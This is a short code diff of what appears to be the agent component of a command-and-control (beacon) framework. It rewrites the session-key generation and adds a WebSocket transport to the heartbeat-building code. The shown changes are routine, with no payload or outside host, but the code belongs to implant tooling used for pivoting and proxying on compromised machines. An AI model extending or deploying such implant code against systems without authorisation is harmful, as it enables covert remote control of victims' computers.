@@ -18,14 +18,16 @@ Agent* Agent_Create()
 	self->memorysaver = MemorySaver_Create();
 	self->proxyfire   = Proxyfire_Create();
 	self->pivotter    = Pivotter_Create();
-	/* Global g_AsyncBofManager is created in MainAgent; avoid second Boffer with uninitialized Vector. */
 	self->asyncBofMgr = NULL;
-
-	self->SessionKey = (PBYTE) MemAllocLocal(16);
-	for (int i = 0; i < 16; i++)
-		self->SessionKey[i] = GenerateRandom32() % 0x100;
-	
-	self->Active = TRUE;
+	self->SessionKey  = (BYTE*)MemAllocLocal(16);
+	for (int i = 0; i < 16; i += 4) {
+		ULONG r = GenerateRandom32();
+		self->SessionKey[i + 0] = (BYTE)(r >> 24);
+		self->SessionKey[i + 1] = (BYTE)(r >> 16);
+		self->SessionKey[i + 2] = (BYTE)(r >> 8);
+		self->SessionKey[i + 3] = (BYTE)r;
+	}
+	self->Active      = TRUE;
 	return self;
 }
 
@@ -113,7 +115,7 @@ BYTE* Agent_BuildBeat(Agent* self, ULONG* size)
 	MemFreeLocal((LPVOID*)&self->info->process_name,  StrLenA(self->info->process_name));
 
 	/* Beat buffer must outlive Packer_Destroy: copy off the packer heap, then destroy packer. */
-#if defined(BEACON_HTTP) || defined(BEACON_DNS)
+#if defined(BEACON_HTTP) || defined(BEACON_DNS) || defined(BEACON_WS)
 
 	ULONG beat_size = Packer_datasize(packer);
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
